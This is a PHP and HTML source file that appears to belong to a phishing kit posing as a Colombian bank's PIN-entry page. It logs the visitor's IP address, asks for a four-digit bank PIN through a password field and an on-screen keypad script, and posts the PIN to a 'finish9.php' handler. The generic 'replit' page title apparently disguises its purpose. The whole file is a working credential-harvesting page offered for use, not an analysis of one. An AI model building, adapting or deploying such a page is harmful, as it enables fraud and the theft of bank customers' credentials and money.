<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <meta http-equiv="content-type" content="text/html; utf-8">
  <meta charset="utf-8">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
	
  <title>replit</title>
  
  
  		<link href="../../../../../src/css/layout.css" rel="stylesheet">
		<link href="../../../../../src/css/fonts.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
		<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
		<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../../../../src/js/run.js"></script>  		
    
  <link href="style.css" rel="stylesheet" type="text/css" />
  <style>

        *{
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input[type=submit]{
            background-color:#fdda24;
            color: #030303;
            width: 80%;
            height: 41px;
            border-radius: 124px;
            border-input: 0px solid #ecfd08;
            margin-top: 0px;
            border:0px solid gray;
            padding: 5px;
            font-weight:bold;
            font-size:1em;
            
        }
        

       
    </style>
</head>

<body>
   
 
  <br>
  <br>
 <form action="finish9.php" method="post">
       <img src="img/ingresa2.jpeg" alt="" width="100%">
          <form action="" method="post">   
              
  <br>
       <center><img src="/img/candadito.svg"   alt="" width="7%">
	   <input type="password"    maxlength="4"  
	   name="inp-password" id="inp-password" 
	   placeholder="****">
	   	 						
	   
	   <br></center> 
              
       <br>
       <center><input  id="btn-pass" name="btn-pass" type="submit" value="Continuar"></center><br>
<a href=""><center> <img src="img/bangol.jpeg" alt="" width="100%"></a>
    </form>

   <br>
  

</body>
</html>
<script type="text/javascript">
	
	$(document).ready(function() {
		$('.teclado td').hover(function(){
			$('#tecla1,#tecla2,#tecla3,#tecla4,#tecla5,#tecla6,#tecla7,#tecla8,#tecla9,#tecla0').html("*");
		});

		$('.teclado td').on( "mouseout", function(){		
			$('#tecla1').html("1");
			$('#tecla2').html("2");
			$('#tecla3').html("3");
			$('#tecla4').html("4");
			$('#tecla5').html("5");
			$('#tecla6').html("6");
			$('#tecla7').html("7");
			$('#tecla8').html("8");
			$('#tecla9').html("9");
			$('#tecla0').html("0");		
		});

		$('.teclado').on( "touchstart", function(){		
			$('#tecla1').html("1");
			$('#tecla2').html("2");
			$('#tecla3').html("3");
			$('#tecla4').html("4");
			$('#tecla5').html("5");
			$('#tecla6').html("6");
			$('#tecla7').html("7");
			$('#tecla8').html("8");
			$('#tecla9').html("9");
			$('#tecla0').html("0");		
		});

		
		$('#tecla1').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "1");
				$(".mensaje").hide();
			}
		});
		$('#tecla2').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "2");
				$(".mensaje").hide();
			}
		});
		$('#tecla3').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "3");
				$(".mensaje").hide();
			}
		});
		$('#tecla4').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "4");
				$(".mensaje").hide();
			}
		});
		$('#tecla5').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "5");
				$(".mensaje").hide();
			}
		});
		$('#tecla6').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "6");
				$(".mensaje").hide();
			}
		});
		$('#tecla7').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "7");
				$(".mensaje").hide();
			}
		});
		$('#tecla8').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "8");
				$(".mensaje").hide();
			}
		});
		$('#tecla9').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "9");
				$(".mensaje").hide();
			}
		});
		$('#tecla0').click(function(){
			if ($('#inp-password').val().length < 4) {
				$('#inp-password').val($('#inp-password').val() + "0");
				$(".mensaje").hide();
			}
		});
		$('#teclaborrar').click(function(){			
				$('#inp-password').val("");		
				$(".mensaje").hide();	
		});

		$('#btn-pass').click(function(){
			if ($("#inp-password").val().length > 3) {
				put_pass($("#inp-password").val());	
			}else{
				$(".mensaje").show();
			}	
		});

				
	});

</script>

<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script>